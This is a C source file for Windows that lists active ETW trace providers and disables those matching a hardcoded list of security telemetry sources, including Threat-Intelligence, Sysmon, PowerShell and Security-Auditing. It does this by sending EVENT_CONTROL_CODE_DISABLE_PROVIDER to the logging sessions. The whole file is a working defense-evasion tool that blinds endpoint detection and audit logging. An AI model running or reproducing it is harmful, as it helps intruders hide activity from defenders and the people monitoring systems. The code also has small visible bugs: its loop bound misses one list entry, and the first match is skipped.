#define _WIN32_WINNT 0x0601 

#include <windows.h>
#include <stdio.h>
#include <evntrace.h>
#include <tdh.h>

void printfGuid(GUID guid);

typedef struct __LIST_GUID {
    GUID guid;
    VOID *next;
} LIST_GUID;

BOOL IsPartOfTheList(LPWSTR provider) {
    LPWSTR list[] = {   L"Microsoft-Windows-Audit-CVE",
                        L"Microsoft-Windows-Threat-Intelligence",
                        L"Microsoft-Windows-Kernel-Process",
                        L"Microsoft-Windows-Kernel-Network",
                        L"Microsoft-Windows-Kernel-Registry",
                        L"Microsoft-Windows-Kernel-File",
                        L"Microsoft-Windows-WinINet",
                        L"Microsoft-Windows-WinINet-Capture",
                        L"Microsoft-Windows-DNS-Client",
                        L"Microsoft-Windows-SMBClient",
                        L"Microsoft-Windows-SMBServer",
                        L"Microsoft-Windows-WMI-Activity",
                        L"Microsoft-Windows-Sysmon",
                        L"Microsoft-Windows-PowerShell",
                        L"Microsoft-Windows-Security-Auditing",
                        L"Microsoft-Windows-Kernel-Audit-API-Calls"};
    DWORD dwSize = 15;
    DWORD i = 0;
    for(i; i < dwSize; i++) {
        DWORD dwCurrentSize = wcslen(list[i]) * 2;
    
        if(memcmp(provider, list[i], dwCurrentSize) == 0) {
            return TRUE;
        }
    }
    return FALSE;
}

BOOL IsAlreadyKnown(LIST_GUID **lg, GUID guid) {

    LIST_GUID *head = NULL;
    LIST_GUID *current = NULL;
    if(*lg == NULL) {
        LIST_GUID *node = (LIST_GUID*)GlobalAlloc(GPTR, sizeof(LIST_GUID));
        node->guid = guid;
        *lg = node;

        return TRUE;
    }
    head = *lg;

    do {
        if(IsEqualGUID(&head->guid, &guid)) {
            return TRUE;
        }
        current = head;
        head = head->next;
    } while(head != NULL);

    LIST_GUID *newNode = (LIST_GUID*)GlobalAlloc(GPTR, sizeof(LIST_GUID));
    newNode->guid = guid;
    current->next = newNode;

    return FALSE;
}

VOID FreeKnownList(LIST_GUID *lg) {
    LIST_GUID *head = lg;
    LIST_GUID *previous = NULL;

    if(head->next == NULL) {
        GlobalFree(head);
        return;
    }

    while(head->next != NULL) {
        previous = head;
        head = head->next;
    }

    previous->next = NULL;
    GlobalFree(head);
    FreeKnownList(lg);
}

FARPROC Resolve(CHAR *dll, CHAR *func) {
    return GetProcAddress(LoadLibrary(dll), func);
}

void printfGuid(GUID guid) {
    printf("{%08lX-%04hX-%04hX-%02hhX%02hhX-%02hhX%02hhX%02hhX%02hhX%02hhX%02hhX}\n", 
      guid.Data1, guid.Data2, guid.Data3, 
      guid.Data4[0], guid.Data4[1], guid.Data4[2], guid.Data4[3],
      guid.Data4[4], guid.Data4[5], guid.Data4[6], guid.Data4[7]);
}

int main(int argc, char **argv) {
    LIST_GUID *lg = NULL;
    FARPROC TdhEnumerateProviders = Resolve("tdh.dll", "TdhEnumerateProviders");
	PROVIDER_ENUMERATION_INFO *pei = NULL;
	ULONG peiSize = 0;

    if(TdhEnumerateProviders(pei, &peiSize) == ERROR_INSUFFICIENT_BUFFER) {
        printf("allocating %d bytes for the PROVIDER_ENUMERATION_INFO structure\n", peiSize);
        pei = (PROVIDER_ENUMERATION_INFO*)GlobalAlloc(GPTR, peiSize);
        printf("mem at %p\n", pei);
    }

    if(TdhEnumerateProviders(pei, &peiSize) != ERROR_SUCCESS) {
        printf("failed to get data from TdhEnumerateProviders %d\n", GetLastError());
    }

    GUID *guids = (GUID*)GlobalAlloc(GPTR, BUFSIZ);
    DWORD dwGuidSize = BUFSIZ;
    DWORD dwListSize = 0;

    while (EnumerateTraceGuidsEx(TraceGuidQueryList, NULL, 0, guids, dwGuidSize, &dwListSize) == ERROR_INSUFFICIENT_BUFFER) {
		dwGuidSize = dwListSize;
		guids = (GUID*)GlobalReAlloc(guids, dwGuidSize, GMEM_ZEROINIT | GMEM_MOVEABLE);
	}

    DWORD dwGuidCount = dwListSize / sizeof(GUID);
    DWORD i = 0;	
    for (i; i < dwGuidCount; i++) {
        GUID guid = guids[i];

        TRACE_GUID_INFO *tgis = (TRACE_GUID_INFO*)GlobalAlloc(GPTR, BUFSIZ);
        DWORD dwProviderSize = BUFSIZ;
        DWORD dwProviderListSize = 0;

        while (EnumerateTraceGuidsEx(TraceGuidQueryInfo, &guid, sizeof(GUID), tgis, dwProviderSize, &dwProviderListSize) == ERROR_INSUFFICIENT_BUFFER) {
            dwProviderSize = dwProviderListSize;
            tgis = (TRACE_GUID_INFO*)GlobalReAlloc(tgis, dwProviderSize, GMEM_ZEROINIT | GMEM_MOVEABLE);
        }

        TRACE_PROVIDER_INSTANCE_INFO *tpii = (TRACE_PROVIDER_INSTANCE_INFO*)((BYTE*)tgis + sizeof(TRACE_GUID_INFO));
        DWORD j = 0;
        for (j; j < tgis->InstanceCount; j++) {
            if(tpii->EnableCount > 0) {
                
                TRACE_ENABLE_INFO *tei = (TRACE_ENABLE_INFO*)((BYTE*)tpii + sizeof(TRACE_PROVIDER_INSTANCE_INFO));
                DWORD k = 0;
                for (k; k < tpii->EnableCount; k++)	{
                    USHORT id = tei->LoggerId;
                    DWORD l = 0;
                    for (l; l < pei->NumberOfProviders; l++) {

                        if(IsEqualGUID(&guid, &(pei->TraceProviderInfoArray[l].ProviderGuid))) {
                            LPWSTR name = NULL;
                            name = (LPWSTR)((DWORD_PTR)pei + pei->TraceProviderInfoArray[l].ProviderNameOffset);
                            if(IsPartOfTheList(name)) {
                                if(!IsAlreadyKnown(&lg, guid)) {
                                    printf("Interesting name found: %ls\n-----------------------------------------------------------\n", name);
                                    printfGuid(guid);
                                    printf("LoggerId: %d\n", id);

                                    if(EnableTraceEx2((TRACEHANDLE)id, &guid, EVENT_CONTROL_CODE_DISABLE_PROVIDER, TRACE_LEVEL_VERBOSE, 0, 0, 0, NULL) == ERROR_SUCCESS) {
                                        printf("%ls was set to EVENT_CONTROL_CODE_DISABLE_PROVIDER.\n\n", name);
                                    } else {
                                        printf("Failed to set EVENT_CONTROL_CODE_DISABLE_PROVIDER. Error %d\n\n", GetLastError());
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        GlobalFree(tgis);
    }

    GlobalFree(guids);
    GlobalFree(pei);
    FreeKnownList(lg);

    return 0;
}
